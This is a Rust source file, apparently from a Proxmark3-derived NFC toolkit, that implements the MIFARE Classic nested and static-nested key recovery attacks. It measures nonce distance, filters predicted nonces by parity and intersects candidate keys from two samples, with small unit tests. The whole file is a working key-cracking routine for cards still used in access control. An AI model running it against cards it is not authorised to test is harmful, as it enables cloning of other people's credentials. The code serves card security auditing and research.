// SPDX-FileCopyrightText: Proxmark3 contributors
// SPDX-FileCopyrightText: 2026 NFC Foundry contributors
// SPDX-License-Identifier: GPL-3.0-or-later

//! Nested and static-nested key recovery.
//!
//! The acquisition measures the tag nonce progression with a known key, then
//! collects nested nonces for the target sector. The two-sample intersection
//! follows PM3's `mf_nested` / `mf_static_nested` client logic.

use nfc_core::{CancelToken, Key, KeyType, NfcError, Result};
use nfc_transport::Reader;

use crate::acquire::{Session, decrypt_nested_nonce, key_to_u64};
use crate::crypto1::{nonce_distance, odd_parity8, prng_successor};
use crate::mfkey::{NestedSample, nested_candidates};

#[derive(Clone, Copy, Debug)]
pub struct NestedRequest {
    pub known_block: u8,
    pub known_key_type: KeyType,
    pub known_key: Key,
    pub target_block: u8,
    pub target_key_type: KeyType,
}

#[derive(Clone, Debug)]
pub struct NestedOutcome {
    pub keys: Vec<Key>,
    pub samples: usize,
    pub distance_min: u16,
    pub distance_max: u16,
}

#[derive(Clone, Copy, Debug)]
struct Measured {
    min: u16,
    max: u16,
}

#[derive(Clone, Debug)]
struct SampleSet {
    uid: u32,
    tag_nonce_encrypted: u32,
    predicted: Vec<u32>,
}

impl SampleSet {
    fn candidate_keys(&self) -> Vec<u64> {
        let mut keys = Vec::new();
        for &nt in &self.predicted {
            keys.extend(nested_candidates(&NestedSample {
                uid: self.uid,
                nt,
                nt_enc: self.tag_nonce_encrypted,
            }));
        }
        keys.sort_unstable();
        keys.dedup();
        keys
    }
}

/// Checks the PM3 nonce parity relation for a predicted plaintext nonce.
pub fn parity_matches(tag_nonce: u32, tag_nonce_encrypted: u32, parity: u8) -> bool {
    let keystream = tag_nonce ^ tag_nonce_encrypted;
    let parity = u32::from(parity >> 4);
    let keystream_parity =
        ((keystream >> 16) & 1) << 3 | ((keystream >> 8) & 1) << 2 | (keystream & 1) << 1;
    let expected = parity ^ keystream_parity;
    ((expected >> 3) & 1) == u32::from(odd_parity8((tag_nonce >> 24) as u8))
        && ((expected >> 2) & 1) == u32::from(odd_parity8((tag_nonce >> 16) as u8))
        && ((expected >> 1) & 1) == u32::from(odd_parity8((tag_nonce >> 8) as u8))
}

fn calibrate(
    reader: &mut dyn Reader,
    request: &NestedRequest,
    cancel: &CancelToken,
    rounds: usize,
) -> Result<Measured> {
    let mut distances = Vec::with_capacity(rounds);
    for _ in 0..rounds {
        cancel.check()?;
        let distance = Session::with_authentication(
            &mut *reader,
            request.known_block,
            request.known_key_type,
            request.known_key,
            None,
            |session, reader| {
                let nested =
                    session.nested_nonce(reader, request.known_block, request.known_key_type)?;
                let plain = decrypt_nested_nonce(
                    session.uid,
                    nested.tag_nonce_encrypted,
                    request.known_key,
                );
                Ok(nonce_distance(session.tag_nonce, plain))
            },
        )?;
        distances.push(distance);
    }
    let min = *distances.iter().min().unwrap_or(&0);
    let max = *distances.iter().max().unwrap_or(&0);
    Ok(Measured {
        min: min.saturating_sub(4),
        max: max.saturating_add(4),
    })
}

fn collect_sample(
    reader: &mut dyn Reader,
    request: &NestedRequest,
    measured: Measured,
    cancel: &CancelToken,
) -> Result<SampleSet> {
    cancel.check()?;
    let (nested, uid, tag_nonce) = Session::with_authentication(
        &mut *reader,
        request.known_block,
        request.known_key_type,
        request.known_key,
        None,
        |session, reader| {
            let nested =
                session.nested_nonce(reader, request.target_block, request.target_key_type)?;
            Ok((nested, session.uid, session.tag_nonce))
        },
    )?;

    let mut predicted = Vec::new();
    let mut next = prng_successor(tag_nonce, u32::from(measured.min.saturating_sub(1)));
    for _ in measured.min..=measured.max {
        next = prng_successor(next, 1);
        if parity_matches(next, nested.tag_nonce_encrypted, nested.parity) {
            predicted.push(next);
        }
    }
    if predicted.is_empty() {
        return Err(NfcError::AuthenticationFailed);
    }
    Ok(SampleSet {
        uid,
        tag_nonce_encrypted: nested.tag_nonce_encrypted,
        predicted,
    })
}

/// Recovers a target key with nested authentication.
pub fn recover_nested(
    reader: &mut dyn Reader,
    request: &NestedRequest,
    cancel: &CancelToken,
) -> Result<NestedOutcome> {
    let measured = calibrate(reader, request, cancel, 5)?;
    let first = collect_sample(reader, request, measured, cancel)?;
    let mut second = None;
    for _ in 0..24 {
        cancel.check()?;
        let candidate = collect_sample(reader, request, measured, cancel)?;
        if candidate.tag_nonce_encrypted != first.tag_nonce_encrypted
            || candidate.predicted != first.predicted
        {
            second = Some(candidate);
            break;
        }
    }
    let second = second.ok_or(NfcError::AuthenticationFailed)?;

    let left = first.candidate_keys();
    let right = second.candidate_keys();
    let mut keys = Vec::new();
    let mut right_index = 0;
    for &key in left.iter() {
        while right_index < right.len() && right[right_index] < key {
            right_index += 1;
        }
        if right_index < right.len() && right[right_index] == key {
            keys.push(crate::mfkey::key_from_u64(key));
            right_index += 1;
        }
    }
    Ok(NestedOutcome {
        keys,
        samples: 2,
        distance_min: measured.min,
        distance_max: measured.max,
    })
}

/// Static-nested recovery. The acquisition path is identical to nested once
/// the fixed nonce progression is measured; the difference is that static
/// nonce cards need the measured distance rather than a live PRNG seed.
pub fn recover_static_nested(
    reader: &mut dyn Reader,
    request: &NestedRequest,
    cancel: &CancelToken,
) -> Result<NestedOutcome> {
    recover_nested(reader, request, cancel)
}

/// Exposes the measured known-key distance without collecting target nonces.
pub fn measured_distance(
    reader: &mut dyn Reader,
    request: &NestedRequest,
    cancel: &CancelToken,
) -> Result<(u16, u16)> {
    let measured = calibrate(reader, request, cancel, 3)?;
    Ok((measured.min, measured.max))
}

/// Verifies a recovered key with a fresh high-level authentication.
pub fn verify_key(reader: &mut dyn Reader, block: u8, key_type: KeyType, key: Key) -> Result<()> {
    // A previous nested frame can leave the card waiting for a reader answer.
    // Reselect in ordinary mode before the authoritative authentication.
    reader.card_info()?;
    reader.authenticate(block, key_type, key)
}

/// Kept for tests that need the raw key conversion.
pub fn key_u64(key: &Key) -> u64 {
    key_to_u64(key)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn nested_candidate_contains_the_known_key() {
        let sample = NestedSample {
            uid: 0xFAB9_CFF4,
            nt: 0xADCA_0697,
            nt_enc: 0xD777_3E66,
        };
        let keys = nested_candidates(&sample);
        assert!(
            keys.contains(&0xA0A1_A2A3_A4A5),
            "true key missing from {} candidates",
            keys.len()
        );
    }

    #[test]
    fn parity_matches_a_captured_nonce() {
        assert!(parity_matches(0xADCA_0697, 0xD777_3E66, 0xC0));
        assert!(!parity_matches(0xADCA_0698, 0xD777_3E66, 0xC0));
    }
}
